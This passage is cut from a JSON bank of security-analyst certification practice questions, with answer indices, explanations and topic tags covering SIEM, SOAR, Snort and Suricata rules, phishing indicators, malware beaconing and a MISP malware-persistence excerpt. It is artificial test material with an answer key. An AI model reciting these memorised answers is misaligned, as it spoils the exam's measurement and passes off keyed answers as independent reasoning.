typically provide alerting, event and log correlation, compliance data gathering and reporting, data and log aggregation, and data retention capabilities. This also means they can be used for forensic analysis since they should be designed to provide a secure copy of data. They do not typically provide performance management–specific capabilities.","l":"c3-tools","l2":"c2-logging","k":"SIEM capabilities"},{"id":"d1-153","set":"d1","ch":3,"d":1,"q":"Kathleen wants to verify on a regular basis that a file has not changed on the system that she is responsible for. Which of the following methods is best suited to this?","o":["Use <code>sha1sum</code> to generate a hash for the file and write a script to check it periodically.","Install and use Tripwire.","Periodically check the MAC information for the file using a script.","Encrypt the file and keep the key secret so the file cannot be modified."],"a":1,"e":"Tripwire and similar programs are designed to monitor files for changes and to report on changes that occur. They rely on file fingerprints (hashes) and are designed to be reliable and scalable. Kathleen’s best bet is to use a tool designed for the job, rather than to try to write her own.","l":"c3-host","l2":"c10-analysis","k":"File integrity monitoring with Tripwire"},{"id":"d1-154","set":"d1","ch":3,"d":1,"q":"Alaina has configured her SOAR system to detect irregularities in geographical information for logins to her organization’s administrative systems. The system alarms, noting that an administrator has logged in from a location that they do not typically log in from. What other information would be most useful to correlate with this to determine if the login is a threat?","o":["Anomalies in privileged account usage","Time-based login information","A mobile device profile change","DNS request anomalies"],"a":0,"e":"In this case, if the user is logged in to administrative systems, privileged account usage would be the most useful additional detail that Alaina could have available. Time-based login information might also prove useful, but a traveling administrative user might simply be in another time zone. Mobile device profile changes and DNS request anomalies are less likely to be correlated with a remote exploit and more likely to be correlated with a compromise of a user device or malware respectively. Rank Software provides a great threat hunting playbook at <code><a href=\"http://www.osintme.com/wp-content/uploads/2022/09/Threat_Hunting_Playbook.pdf\">www.osintme.com/wp-content/uploads/2022/09/Threat_Hunting_Playbook.pdf</a></code> that may prove useful to you as you consider these threats.","l":"c3-uba-scripting","l2":"c3-cloud-social","k":"Privileged account anomaly correlation"},{"id":"d1-155","set":"d1","ch":3,"d":1,"q":"Megan is reviewing a Snort ruleset and encounters the following entry. What will this detect?\n<pre>\n<code>alert tcp any any -&gt; 192.168.1.10 22 (msg: \"ALERT\";sid:10000115; rev:1; )?</code>\n</pre>","o":["Attempts to connect to SSH","Web server connections","FTP traffic","HTTPS connections"],"a":0,"e":"Megan knows that SSH uses port 22 by default and recognizes that TCP traffic from any IP address on any source port to port 22 will detect SSH connections. While other services could be running on this port, web servers typically default to port 80, FTP runs on port 21, and HTTPS runs on port 443.","l":"c3-tools","l2":"c5-portscan","k":"Snort rule port detection"},{"id":"d1-156","set":"d1","ch":3,"d":1,"q":"Frankie’s SIEM flags an IoC detection for a new filter rule in a senior executive’s email account. The filter rule immediately moves all emails with the words “gift card” to their deleted items folder. Why would this most likely be flagged as an IoC?","o":["BEC attacks rely on compromised accounts to send phishing emails, which often ask for recipients to purchase gift cards.","Phishing emails often request gift cards and creating a filter like this is a sign that the user is tired of phishing emails.","Advanced persistent threat actors use the deleted items folder as a storage location for stolen gift card information.","Typosquatting purchases are done with gift cards from compromised email accounts."],"a":0,"e":"Business email compromise (BEC) attacks use compromised email accounts to conduct phishing attacks. These often ask recipients to perform actions like buying gift cards for executives, and ensuring that responses mentioning gift cards aren’t seen by the owner of the compromised email is critical to continued access to the account. While the account owner may be tired of phishing, the IoC is intended to identify compromises rather than legitimate configurations. APT actor storage use and typosquatting purchases could occur, but they’re not the common case like BEC-based phishing emails.","l":"c3-cloud-social","l2":"","k":"BEC mailbox rule IoC"},{"id":"d1-157","set":"d1","ch":3,"d":1,"q":"Tracy is reviewing a suspicious email received by members of her organization that seems to come from the head of HR, Susan Smith. She sees the following email header entries:\n<p>From: “Susan Smith” &lt;ssmith@example.com&gt; Authentication-Results: spf=fail (sender IP is 189.121.80.101); Reply-To: “Susan Smith” HR-noreply@examp1e.com</p>\n<p>What IoC best confirms that this is a spoofing attack instead of a compromised email account?</p>","o":["The reply-to email address","The sender IP address","The SPF fail message","The sender email address"],"a":2,"e":"The SPF failure indicates that the sender IP address is not a trusted address. The fact there is a sender IP address isn’t necessarily an indicator—if it was a trusted address, that would be fine. The reply-to email address is suspicious, but it might be set that way for a compromised account instead of a spoofed email. The sender email address is typically a legitimate address in a scenario like this.","l":"c3-filesandbox","l2":"c3-cloud-social","k":"SPF validation email spoofing"},{"id":"d1-158","set":"d1","ch":4,"d":1,"q":"Micah wants to use the data he has collected to help with his threat-hunting practice. What type of approach is best suited to using large volumes of log and analytical data?","o":["Hypothesis-driven investigation","Investigation based on indicators of compromise","Investigation based on indications of attack","AI/ML-based investigation"],"a":3,"e":"Artificial intelligence (AI) and machine learning (ML) approaches are ideal for large volumes of log and analytical data. Manual processes like hypothesis-driven investigations, or IOC- or IOA-driven investigations, can take significant amounts of time when dealing with large volumes of data.","l":"c4-hunt","l2":"c1-ai","k":"AI/ML threat hunting"},{"id":"d1-159","set":"d1","ch":3,"d":1,"q":"Dani wants to analyze a malware package that calls home. What should she consider before allowing the malware to “phone home”?","o":["Whether the malware may change behavior.","Whether the host IP or subnet may become a target for further attacks.","Attacks may be staged by the malware against other hosts.","All of the above."],"a":3,"e":"Dani needs to carefully consider what could occur while she is analyzing the malware. Once it is allowed to connect to one or more remote systems, she needs to be aware that it may result in behavior changes, probes, or attacks by the attacker, or it could attack other systems once it has a network connection and can receive commands.","l":"c3-filesandbox","l2":"","k":"Dynamic malware analysis risks"},{"id":"d1-160","set":"d1","ch":9,"d":1,"q":"Olivia wants to create a document that describes the specific way that her organization responds to a common malware package. What type of document should she create?","o":["An incident response policy","A playbook","A runbook","A cheatsheet"],"a":2,"e":"Olivia should create a runbook. Runbooks are specific procedures handling a process or task. A playbook is a broader set of guidelines that defines how an organization will respond to something, not the specifics of what needs to be done. An incident response policy is a document describing the high level approach to incidents for an organization. A cheatsheet reminds users of specific steps or methods.","l":"c9-foundation","l2":"","k":"Runbooks vs playbooks"},{"id":"d1-161","set":"d1","ch":4,"d":1,"q":"Unusual outbound network traffic, abnormal HTML response sizes, DNS request anomalies, and mismatched ports for application traffic are all examples of what?","o":["Threat hunting","SCAP","Indicators of compromise","Continuous threat feeds"],"a":2,"e":"There are many indicators of compromise, including the ones listed in this question, as well as things such as anomalies in privileged account usage, abnormal database requests and traffic patterns, geographical and time-based anomalies in usage patterns, unexpected and abnormal traffic growth, and many others. SCAP is an automation protocol, and both threat answers are not a good fit for this list, although threat hunting and threat feeds may include details such as the type of traffic or attack information.","l":"c4-hunt","l2":"c3-network","k":"indicators of compromise"},{"id":"d1-162","set":"d1","ch":3,"d":1,"q":"Naomi wants to improve the detection capabilities for her security environment. A major concern for her company is the detection of insider threats. What type of technology can she deploy to help with this type of proactive threat detection?","o":["IDS","UEBA","SOAR","SIEM"],"a":1,"e":"Since Naomi is specifically concerned about an end-user driven threat in the form of insider threats, a user entity behavior analytics (UEBA) tool is her best option from the list. A UEBA system will monitor for behaviors that are atypical for users such as those that an insider threat may take. An intrusion detection system would detect anomalous network activity and attacks, whereas both SOAR and SIEM systems would be useful for centralizing data from tools such as the UEBA and IDS tools.","l":"c3-uba-scripting","l2":"","k":"user entity behavior analytics"},{"id":"d1-163","set":"d1","ch":1,"d":1,"q":"Ling wants to use her SOAR platform to handle phishing attacks more effectively. What elements of potential phishing emails should she collect as part of her automation and workflow process to triage and assign severity indicators?","o":["Subject lines","Email sender addresses","Attachments","All of the above"],"a":3,"e":"Ling can use her SOAR system to analyze all of the common indicator of phishing emails, including subject line content, sender addresses, attachments, and headers. From there, her SOAR system can assign a severity value to the email and take appropriate action, such as testing attachments in an isolated environment or removing phishing emails from mailboxes across her organization.","l":"c1-efficiency","l2":"c3-filesandbox","k":"SOAR phishing email triage"},{"id":"d1-164","set":"d1","ch":3,"d":1,"q":"Isaac wants to write a script to query the BotScout forum bot blocklisting service. What data should he use to query the service based on the following image?\n<figure><img alt=\"Screenshot details 11 results for an I P address search on BotScout with a table of dates, names, and email addresses.\" loading=\"lazy\" src=\"img/pt/c01un010.png\"/></figure>","o":["Email address","Name","IP address","Date"],"a":2,"e":"The only consistent indicator for this bot in the list is the IP address. Isaac should write his script to validate the IP addresses of systems to see if they should be blocked.","l":"c3-tip-edr","l2":"c3-uba-scripting","k":"IP reputation blocklist querying"},{"id":"d1-165","set":"d1","ch":1,"d":1,"q":"Maria is using a commercial large language model (LLM) to help with her consolidation and analysis of security event data. When she asks the AI about what the most common IoC is, she receives an answer that does not match her own manual review, which she double-checks to be sure of. What has she experienced?","o":["Model poisoning","Hallucination","Being wrong","Malicious prompts"],"a":1,"e":"LLMs can be prone to AI hallucinations because they don’t “know” things—at least as of the writing of this book. Instead, they use information and provide probabilistic responses. That means they can be wrong—sometimes dramatically so. Retaining a human in the loop and checking the work of LLMs is a key part of their use, even with carefully built prompts. There is no indication of model poisoning, and if Maria validated her work, she’s probably not wrong. If Maria didn’t use a malicious prompt, then it’s unlikely one was involved.","l":"c1-ai","l2":"","k":"LLM hallucination"},{"id":"d1-166","set":"d1","ch":1,"d":1,"q":"Yaan uses multiple data sources in his security environment, adding contextual information about users from Active Directory, geolocation data, multiple threat data feeds, as well as information from other sources to improve his understanding of the security environment. What term describes this process?","o":["Data drift","Threat collection","Threat centralization","Data enrichment"],"a":3,"e":"The CySA+ Exam Outline refers to this process as data enrichment. Data enrichment can take many forms, but the basic concept is that adding and correlating multiple data sources provides a richer, more useful data environment. As you might have guessed, the remainder of the options for this question were made up.","l":"c1-efficiency","l2":"c4-collect","k":"data enrichment"},{"id":"d1-167","set":"d1","ch":3,"d":1,"q":"Mila is reviewing feed data from the MISP open source threat intelligence tool and sees the following entry:\n<pre>\n<code>\"Unit 42 has discovered a new malware family we've named</code>\n<code>\"Reaver\" with ties to attackers who use SunOrcal malware.</code>\n<code>SunOrcal activity has been documented to at least 2013, and</code>\n<code>based on metadata surrounding some of the C2s, may have been</code>\n<code>active as early as 2010. The new family appears to have been in</code>\n<code>the wild since late 2016 and to date we have only identified 10</code>\n<code>unique samples, indicating it may be sparingly used. Reaver is</code>\n<code>also somewhat unique in the fact that its final payload is in</code>\n<code>the form of a Control panel item, or CPL file. To date, only</code>\n<code>0.006% of all malware seen by Palo Alto Networks employs this</code>\n<code>technique, indicating that it is in fact fairly rare.\", \"Tag\":</code>\n<code>[{\"colour\": \"#00223b\", \"exportable\": true, \"name\":</code>\n<code>\"osint:source-type=\\\"blog-post\\\"\"}], \"disable_correlation\":</code>\n<code>false, \"object_relation\": null, \"type\": \"comment\"}, {\"comment\":</code>\n<code>\"\", \"category\": \"Persistence mechanism\", \"uuid\": \"5a0a9d47-</code>\n<code>1c7c-4353-8523-440b950d210f\", \"timestamp\": \"1510922426\",</code>\n<code>\"to_ids\": false, \"value\": \"%COMMONPROGRAMFILES%\\\\services\\\\\",</code>\n<code>\"disable_correlation\": false, \"object_relation\": null, \"type\":</code>\n<code>\"regkey\"}, {\"comment\": \"\", \"category\": \"Persistence mechanism\",</code>\n<code>\"uuid\": \"5a0a9d47-808c-4833-b739-43bf950d210f\", \"timestamp\":</code>\n<code>\"1510922426\", \"to_ids\": false, \"value\":</code>\n<code>\"%APPDATA%\\\\microsoft\\\\mmc\\\\\", \"disable_correlation\": false,</code>\n<code>\"object_relation\": null, \"type\": \"regkey\"}, {\"comment\": \"\",</code>\n<code>\"category\": \"Persistence mechanism\", \"uuid\": \"5a0a9d47-91e0-</code>\n<code>4fea-8a8d-48ce950d210f\", \"timestamp\": \"1510922426\", \"to_ids\":</code>\n<code>false, \"value\":</code>\n<code>\"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\</code>\n<code>Shell Folders\\\\Common Startup\"</code>\n</pre>\n<p>How does the Reaver malware maintain persistence?</p>","o":["A blog post","Inserts itself into the Registry","Installs itself as a runonce key","Requests user permission to start up"],"a":1,"e":"The question’s description includes details about the use of the startup Registry entry for Common Startup and lists a Registry key. This means the Reaver malware as described maintains persistence by using a Registry key.","l":"c3-host","l2":"c2-os","k":"Windows Registry persistence"},{"id":"d1-168","set":"d1","ch":1,"d":1,"q":"Isaac’s organization has deployed a security tool that learns how network users typically behave and then searches for differences that match attack behaviors. What type of system can automatically analyze this data to build detection capability like this?","o":["Signature-based analysis","A Babbage machine","Machine learning","Artificial network analysis"],"a":2,"e":"Machine learning (ML) in systems like this relies on datasets to build profiles of behavior that it then uses to identify abnormal behavior. They also use behavioral data that is frequently associated with attacks and malware and use that to compare to the user behavior patterns. Signature-based analysis uses hashing or other related techniques to verify if files match a known malware package. The Babbage machine is a mechanical computer, and artificial network analysis was made up for this question.","l":"c1-ai","l2":"c3-uba-scripting","k":"machine learning behavioral detection"},{"id":"d1-169","set":"d1","ch":1,"d":1,"q":"What is the advantage of a SOAR system over a traditional SIEM system?","o":["SOAR systems are less complex to manage.","SOAR systems handle large log volumes better using machine learning.","SOAR systems integrate a wider range of internal and external systems.","SOAR logs are transmitted only over secure protocols."],"a":2,"e":"Although SIEM and SOAR systems often have similar functionality, SOAR systems are typically designed to work with a broader range of internal and external systems, including threat intelligence feeds and other data sources, and then assist with the automation of responses.","l":"c1-efficiency","l2":"c3-tools","k":"SOAR vs SIEM capabilities"},{"id":"d1-170","set":"d1","ch":9,"d":1,"q":"Fiona discovers definitive evidence that an employee is actively exfiltrating sensitive client data to a personal cloud drive. She immediately isolates the user’s workstation from the network. What is the most important next step for team coordination?","o":["Escalate to her manager and follow the organization’s playbook for this scenario.","Reach out to the employee to determine why they are exfiltrating data.","Notify senior management.","Seize the workstation to gather more forensic evidence."],"a":0,"e":"Notifying management while following the organization’s playbook is a typical process for this type of issue. Contacting the employee for a direct interview or seizing the workstation both typically require management awareness and additional procedural steps. Notifying senior management skips the step of notifying her own chain of command or following internal procedures.","l":"c9-foundation","l2":"c11-contain","k":"incident escalation and playbooks"},{"id":"d1-171","set":"d1","ch":6,"d":1,"q":"Nathan’s SIEM is being flooded with alerts from a rule intended to detect port scans. The rule triggers when an IP address attempts to connect to 100 different ports on a single system within five minutes. Nathan noticed that most of the alerts are being generated due to internal vulnerability scans. How can he best tune this rule to reduce false positives?","o":["Change the rule to trigger after 250 ports in five minutes.","Change the rule to ignore the internal vulnerability scanner.","Change the rule to trigger after 100 ports in one minute.","Disable the rule’s alert notifications."],"a":1,"e":"In this case the least disruptive option is to set the rule to ignore the vulnerability management server. Changing the detection options to require more ports will miss more scans in either case, and disabling the rule will likely cause the organization not to detect port scans.","l":"c6-config","l2":"c3-tools","k":"SIEM rule tuning for scanners"},{"id":"d1-172","set":"d1","ch":3,"d":1,"q":"Adam is reviewing a Wireshark packet capture in order to perform protocol analysis, and he notes the following data in the Wireshark protocol hierarchy statistics. What percentage of traffic is most likely encrypted web traffic?\n<figure><img alt=\"Screenshot details network protocol hierarchy with Transmission Control Protocol, Transport Layer Security, and Hypertext Transfer Protocol.\" loading=\"lazy\" src=\"img/pt/c01un011.png\"/></figure>","o":["85.9%","1.7%","20.3%","1.9%"],"a":2,"e":"The Transport Layer Security entry shows 20.3% of the traffic was sent over TLS. Although this may not all be encrypted web traffic, the likely answer is that the majority of it is.","l":"c3-tools","l2":"","k":"Wireshark protocol hierarchy statistics"},{"id":"d1-173","set":"d1","ch":3,"d":1,"q":"Annie is reviewing a packet capture that she believes includes the download of malware. What host should she investigate further as the source of the malware based on the activity shown in the following image from her packet analysis efforts?\n<figure><img alt=\"Screenshot lists network traffic logs including Source and Destination I P addresses for D N S, T C P, and H T T P protocols.\" loading=\"lazy\" src=\"img/pt/c01un012.png\"/></figure>","o":["172.17.8.8","49.51.172.56","172.17.8.172","56.172.51.49"],"a":1,"e":"A binary file is downloaded from 49.51.172.56, as shown by the <code>GET</code> command for <code>nCvQOQHCBjZFfiJvyVGA/yrkbdmt.bin</code>. Annie should mark this as an indicator of compromise (IoC) and look for other traffic to or from this host, as well as what the workstation or system it is downloaded to does next.","l":"c3-tools","l2":"c4-hunt","k":"packet capture malware source analysis"},{"id":"d1-174","set":"d1","ch":3,"d":1,"q":"Steve uploads a malware sample to an analysis tool and receives the following messages:\n<pre>\n<code>&gt;Executable file was dropped: C:\\Logs\\mffcae1.exe</code>\n<code>&gt;Child process was created, parent C:\\Windows\\system32\\cmd.exe</code>\n<code>&gt;mffcae1.exe connects to unusual port</code>\n<code>&gt;File downloaded: cx99.exe</code>\n</pre>\n<p>If he wanted to observe the download behavior himself, what is the best tool to capture detailed information about what occurs?</p>","o":["An antimalware tool","Wireshark","An IPS","Network flows"],"a":1,"e":"Steve could use Wireshark to capture the download traffic and to observe what host the file was downloaded from. Antimalware tools typically remove the malware but do not provide detailed visibility into its actions. An IPS can detect attacks but would need specific rules to detect the actions taken. Network flows will show where the traffic went but will not provide detailed specifics like a packet capture tool would.","l":"c3-tools","l2":"c3-filesandbox","k":"packet capture analysis with Wireshark"},{"id":"d1-175","set":"d1","ch":2,"d":1,"q":"Abdul is analyzing proxy logs from servers that run in his organization and notices two proxy log servers have entries for similar activities that always occur one hour apart from each other. Both proxy servers are in the same datacenter, and the activity is part of a normal evening process that runs at 7 p.m. One proxy server records the data at 7 p.m., and one records the entry at 6 p.m. What issue has Abdul likely encountered?","o":["A malware infection emulating a legitimate process","An incorrect time zone setting","A flaw in the automation script","A log entry error"],"a":1,"e":"A relatively common issue during log reviews is time synchronization problems due to incorrect or mismatched time zone settings. Many organizations that operate in more than one time zone use Universal Time Coordinated (UTC) to avoid having to do time zone corrections when comparing logs. In this case, Abdul should check the server that is recording the events at 6 p.m. to see if it is set to the wrong time zone or otherwise is misconfigured to have the wrong system time.","l":"c2-logging","l2":"","k":"log time synchronization and timezone"},{"id":"d1-176","set":"d1","ch":1,"d":1,"q":"Eric wants to send an update to a service every time an event happens. Which of the following integration options makes the most sense for this?","o":["A webhook","A queue","An API","A plug-in"],"a":0,"e":"Webhooks are event driven, and thus are resource efficient for uses like this where data is pushed when something happens. An API is client initiated and is more typically used to fetch data. A queue is used to process items in order, and a plug-in adds features of capabilities to a tool.","l":"c1-efficiency","l2":"c2-infra","k":"webhook integration"},{"id":"d1-177","set":"d1","ch":4,"d":1,"q":"Jim is reviewing an APT behavioral IoC that his SIEM has flagged. He notices that the IoC was published by an open source intelligence organization in 2020. What confidence level impact factor should he raise a concern about?","o":["Accuracy","Relevance","Impact","Timeliness"],"a":3,"e":"Jim should be concerned about the timeliness of the IoC. A multiple-year-old behavioral IoC provides lots of time for other threat actors to adopt the behavior. It may still be an accurate detection of malicious behavior, and it may still be relevant, but not to the APT in question. Impact is not one of the three factors associated with confidence level assessment.","l":"c4-collect","l2":"","k":"threat intelligence timeliness"},{"id":"d1-178","set":"d1","ch":3,"d":1,"q":"Benicio wants to implement a tool for all the workstations and laptops in his company that can combine behavioral detection attack indicators based on current threat intelligence with real-time visibility into the systems. What sort of tool should he select?","o":["An IPS","An EDR","A CRM","A UEBA"],"a":1,"e":"Endpoint detection and response (EDR) tools are integrated security solutions that monitor endpoint systems and collect activity data and then use threat intelligence and behavior to automatically respond by removing or quarantining potential threats. EDR tools can also be helpful for forensic analysis and incident response. An IPS would be useful for monitoring network traffic, a CRM is a customer relationship management tool, and a UEBA would capture user behavior but does not have the same threat intelligence and response capabilities that an EDR has.","l":"c3-tip-edr","l2":"c1-endpoint-pentest","k":"endpoint detection and response"},{"id":"d1-179","set":"d1","ch":3,"d":1,"q":"Eric wants to analyze a malware binary in the safest way possible. Which of the following methods has the least likelihood of allowing the malware to cause problems?","o":["Running the malware on an isolated VM","Performing dynamic analysis of the malware in a sandbox","Performing static analysis of the malware","Running the malware in a container service"],"a":2,"e":"Although you can build an isolated sandbox or VM, the safest way to analyze malware is to analyze the source code rather than running it. Thus, static analysis is the safest answer, but it may not be as useful as dynamic analysis where you can capture what the malware does as it happens. Static analysis can also be significantly slower because of the effort required to disassemble the code and reverse-engineer what it is doing.","l":"c3-filesandbox","l2":"","k":"static vs dynamic malware analysis"},{"id":"d1-180","set":"d1","ch":2,"d":1,"q":"Tom wants to improve his detection capabilities for his software-as-a-service (SaaS) environment. What technology is best suited to give him a view of usage, data flows, and other details for cloud environments?","o":["EDR","CASB","IDS","SIEM"],"a":1,"e":"A cloud access security broker (CASB) is the ideal tool to increase Tom’s visibility into cloud services. CASB tools are specifically designed to monitor for cloud access patterns and to ensure that unwanted activity does not occur.","l":"c2-netarch","l2":"c3-cloud-social","k":"cloud access security broker"},{"id":"d1-181","set":"d1","ch":3,"d":1,"q":"Juan wants to audit filesystem activity in Windows and configures Windows filesystem auditing. What setting can he set to know if a file was changed or not using Windows file auditing?","o":["Set Detect Change","Set Validate File Versions","Set Audit Modifications","None of the above"],"a":3,"e":"Windows filesystem auditing does not provide the ability to detect if files were changed. Forensic artifacts can indicate that a file was opened and identify the program that opened it. However, unlike tools such as Tripwire that track file hashes and thus can identify modifications, Windows file auditing cannot provide this detail.","l":"c3-host","l2":"c2-os","k":"Windows filesystem auditing limitations"},{"id":"d1-182","set":"d1","ch":3,"d":1,"q":"Naomi wants to analyze URLs found in her passive DNS monitoring logs to find domain generation algorithm (DGA)–generated command-and-control links. What techniques are most likely to be useful for this?","o":["WHOIS lookups and NXDOMAIN queries of suspect URLs","Querying URL allowlists","DNS probes of command-and-control networks","Natural language analysis of domain names"],"a":0,"e":"URL analysis of domain generation algorithm–created uniform resource locators (URLs) relies on either testing URLs via WHOIS lookups and NXDOMAIN responses or using machine learning (ML) techniques, which recognize patterns common to DGA-generated URLs. Natural language processing focuses on understanding natural language data, but DGAs do not rely on natural language–style URLs in most cases.","l":"c3-network","l2":"c3-tip-edr","k":"DGA detection techniques"},{"id":"d1-183","set":"d1","ch":3,"d":1,"q":"Kathleen wants to ensure that her team of security analysts sees important information about the security status of her organization whenever they log in to the SIEM. What part of a SIEM is designed to provide at-a-glance status information using the “single pane of glass” approach?","o":["The reporting engine","Email reports","The dashboard","The ruleset"],"a":2,"e":"The SIEM dashboard is the first thing you see when you log in to almost any SIEM product. Configuring dashboards to provide the most relevant and useful information is an important activity for more SIEM operations staff. The reporting engine is useful for more in-depth detail and also typically helps feed the dashboard. Email reports can be useful to ensure regular delivery to users who may not have an account on the SIEM or for other purposes where an event-driven or schedule-driven report is useful. A SIEM ruleset defines what a SIEM does and when, but it isn’t useful for a quick view.","l":"c3-tools","l2":"","k":"SIEM dashboards"},{"id":"d1-184","set":"d1","ch":3,"d":1,"q":"Lucca is reviewing <code>bash</code> command history logs on a system that he suspects may have been used as part of a breach. He discovers the following <code>grep</code> command run inside of the <code>/users</code> directory by an administrative user. What will the command find?\n<pre>\n<code>grep -r \"sudo\" /home/users/ | grep \"bash.log\"</code>\n</pre>","o":["All occurrences of the <code>sudo</code> command on the system","All occurrences of root logins by users","All occurrences of the <code>sudo</code> command in bash log files in user home directories","All lines that do not contain the word <code>sudo</code> or <code>bash.log</code> in user directories"],"a":2,"e":"In this scenario, the attacker may have been trying to find users who have typed credentials into a <code>sudo</code> command in a script. This will find all occurrences of the <code>sudo</code> command in all the <code>/home/users</code> subdirectories and will then feed that output to a search for <code>bash.log</code>, meaning that only occurrences of <code>sudo</code> inside of <code>bash.log</code> entries will be returned.","l":"c3-uba-scripting","l2":"c3-host","k":"grep log analysis"},{"id":"d1-185","set":"d1","ch":3,"d":1,"q":"Cynthia wants to build scripts to detect malware beaconing behavior. Which of the following is not a typical means of identifying malware beaconing behavior on a network?","o":["Persistence of the beaconing","Beacon protocol","Beaconing interval","Removal of known traffic"],"a":1,"e":"Unless Cynthia already knows the protocol that a particular beacon uses, filtering out beacons by protocol may cause her to miss beaconing behavior. Attackers want to dodge common analytical tools and will use protocols that are less likely to attract attention. Filtering network traffic for beacons based on the intervals and frequency they are sent at, if the beacon persists over time, and removing known traffic are common means of filtering traffic to identify beacons.","l":"c3-network","l2":"","k":"malware beaconing detection"},{"id":"d1-186","set":"d1","ch":4,"d":1,"q":"Eric is reviewing threat intelligence from AlienVault’s Open Threat Exchange (OTX) and receives a pulse. What should he expect to find in a pulse?","o":["A notification of an update to the platform","A daily newsletter about new threats","A summary of a threat including IoCs","A status check that the OTX service is online"],"a":2,"e":"OTX’s pulses are the format that OTX uses to share threat information. A pulse includes a threat summary and related IoCs.","l":"c4-collect","l2":"c4-hunt","k":"AlienVault OTX pulse"},{"id":"d1-187","set":"d1","ch":3,"d":1,"q":"Kelly sees high CPU utilization in the Windows Task Manager, as shown here, while reviewing a system’s performance issues. If she wants to get a detailed view of the CPU usage by application, with PIDs and average CPU usage, what native Windows tool can she use to gather that detail?\n<figure><img alt=\"Screenshot details Intel C P U usage over 60 seconds with 14 percent utilization, 4 cores, and 6 days and 33 minutes of up time.\" loading=\"lazy\" src=\"img/pt/c01un013.png\"/></figure>","o":["Resource Monitor","Task Manager","iperf","Perfmon"],"a":0,"e":"Resource Monitor (<code>resmon.exe</code>) provides average CPU utilization in addition to real-time CPU utilization. It also breaks out data by specific processes. Since Kelly wants to see average usage over time, she is better off using Resource Monitor instead of Task Manager (which meets all of her other requirements). Performance Monitor (<code>perfmon.exe</code>) is useful for collecting performance data but only in summary form, and iperf is a network performance measurement tool.","l":"c3-host","l2":"c2-os","k":"Windows Resource Monitor"},{"id":"d1-188","set":"d1","ch":3,"d":1,"q":"Roger’s monitoring system provides Windows memory utilization reporting. Use the chart shown here to determine what actions Roger should take based on his monitoring.\n<figure>\n<img alt=\"Screenshot details memory capacity forecast for dev aus lali 02 with 75 percent load from January to April and capacity over 1 year.\" loading=\"lazy\" src=\"img/pt/c01un014.png\"/></figure>","o":["The memory usage is stable and can be left as it is.","The memory usage is high and must be addressed.","Roger should enable automatic memory management.","There is not enough information to make a decision."],"a":0,"e":"Roger has memory usage monitoring enabled with thresholds shown at the bottom of the chart that will generate an alarm if it continues. The chart shows months of stable memory utilization with very little deviation. Although a sudden increase could happen, this system appears to be functioning well.","l":"c3-host","l2":"","k":"memory consumption monitoring"},{"id":"d1-189","set":"d1","ch":4,"d":1,"q":"NIST defines five major types of threat information in NIST SP 800-150, “Guide to Cyber Threat Information Sharing.”<ol class=\"decimal\" start=\"1\">\n<li>Indicators, which are technical artifacts or observables that suggest an attack is imminent, currently underway, or compromise may have already occurred.</li>\n<li>Tactics, techniques, and procedures that describe the behavior of an actor.</li>\n<li>Security alerts like advisories and bulletins.</li>\n<li>Threat intelligence reports that describe actors, systems, and information being targeted and the methods being used.</li>\n<li>Tool configurations that support collection, exchange, analysis, and use of threat information.</li></ol>\n<p>Which of these should Frank seek out to help him best protect the midsize organization he works for against unknown threats?</p>","o":["1, 2, and 5","1, 3, and 5","2, 4, and 5","1, 2, and 4"],"a":1,"e":"The more effort Frank puts into staying up-to-date with information by collecting threat information (5), monitoring for indicators (1), and staying up-to-date on security alerts (3), the stronger his organization’s security will be. Understanding specific threat actors may become relevant if they specifically target organizations like Frank’s, but as a midsize organization, Frank’s employer is less likely to be specifically targeted directly.","l":"c4-collect","l2":"","k":"NIST SP 800-150 threat information"},{"id":"d1-190","set":"d1","ch":3,"d":1,"q":"Deepa is diagnosing major network issues at a large organization that has recently experienced an uptick in anomalous activity and sees the following graph in her PRTG console on the “outside” interface of her border router. What can Deepa presume has occurred?\n<figure><img alt=\"Graph details 2 metrics of megabits per second over 60 minutes with 15-second intervals and a spike to 400 after 09.30.\" loading=\"lazy\" src=\"img/pt/c01un015.png\"/></figure>","o":["The network link has failed.","A DDoS is in progress.","An internal system is transferring a large volume of data.","The network link has been restored."],"a":3,"e":"A sudden resumption of traffic headed “in” after sitting at zero likely indicates a network link or route has been repaired. A link failure would show a drop to zero, rather than an increase. The complete lack of inbound traffic prior to the resumption at 9:30 makes it unlikely this is a DDoS, and the internal systems are not sending significant traffic outbound.","l":"c3-network","l2":"","k":"network traffic monitoring"},{"id":"d1-191","set":"d1","ch":3,"d":1,"q":"Angela wants to use her network security device to detect potential beaconing behavior. Which of the following options is best suited to detecting beaconing using her network security device?","o":["Antivirus definitions","File reputation","IP reputation","Static file analysis"],"a":2,"e":"Angela’s best choice would be to implement IP reputation to monitor for connections to known bad hosts. Antivirus definitions, file reputation, and static file analysis are all useful for detecting malware, but command-and-control traffic like beaconing will typically not match definitions, won’t send known files, and won’t expose files for analysis.","l":"c3-tip-edr","l2":"c3-network","k":"IP reputation"},{"id":"d1-192","set":"d1","ch":3,"d":1,"q":"Brian wants to deploy a tool that will allow him to combine multiple open source threat feeds in order to correlate threat data. What tool should he deploy?","o":["The Metasploit framework","OpenCTI","The Harvester","The ATT&amp;CK server"],"a":1,"e":"OpenCTI is an open source threat intelligence platform that can ingest multiple threat feeds and allows correlation and other activities across feed data. The Metasploit framework is a modular tool for vulnerability assessment and exploit development. The Harvester is an OSINT gathering tool, and ATT&amp;CK is a framework, not a server.","l":"c3-tip-edr","l2":"c4-collect","k":"threat intelligence platforms"},{"id":"d1-193","set":"d1","ch":3,"d":1,"q":"Maria is reviewing the Suricata rule shown below and believes it is not properly detecting DNS lookups for a malicious domain. What should she change if she wants to detect traffic containing the URL <code>malicious.org/example</code>?\n<pre>\n<code>alert dns any any -&gt; any any (msg:\"DNS LOOKUP </code>\n<code>for_malicous.org\"; dns.query; content:\"*\"; </code>\n<code>sid:1000001;)</code>\n</pre>","o":["Change <code>content</code> to read <code>content: <a href=\"http://malicious.org\">malicious.org</a></code>.","Change the target to read <code><a href=\"http://malicious.org\">malicious.org</a> any</code>.","Change the source to read <code><a href=\"http://malicious.org\">malicious.org</a> any</code>.","Change <code>msg</code> to read <code>DNS LOOKUP for <a href=\"http://malicious.org\">malicious.org</a></code>."],"a":0,"e":"Maria wants to detect DNS lookups for <code><a href=\"http://malicious.org\">malicious.org</a></code>, so she needs to capture content containing that text. Lookups will not necessarily go to a <code><a href=\"http://malicious.org\">malicious.org</a></code> server and could be resolved by other DNS servers. The <code>msg</code> field is used to tag hits, not to detect specific content.","l":"c3-tools","l2":"","k":"Suricata rule 